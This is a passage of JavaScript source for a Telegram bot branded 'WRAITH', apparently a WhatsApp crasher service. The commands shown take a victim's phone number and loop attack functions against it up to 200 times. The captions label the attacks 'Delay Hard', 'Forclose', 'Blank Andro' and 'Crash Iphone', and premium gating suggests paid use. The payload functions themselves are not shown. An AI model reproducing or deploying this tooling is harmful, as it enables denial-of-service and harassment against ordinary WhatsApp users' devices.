  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Hard
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
   await ExploitDelayV1(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Hard
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("yudbet", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /yudbet 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡
☐ Target: ${q}
☐ Type: Forclose 1 Message
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 1; i++) {
   await oneAmountV5(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Forclose 1 Message
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("gimmel", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /gimmel 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡
☐ Target: ${q}
☐ Type: Forclose Bebas Spam
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 1; i++) {
   await oneAmountV5(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Forclose Bebas Spam
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});


bot.command("aleph", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /aleph 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Blank Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankontolz(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Blank Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("dallet", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /dallet 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Iphone
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
   await Cloreds(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ W R A I T H ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Iphone
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
//============( FUNCTION BUG ) =======\\
//============( END ) =======\\
bot.launch()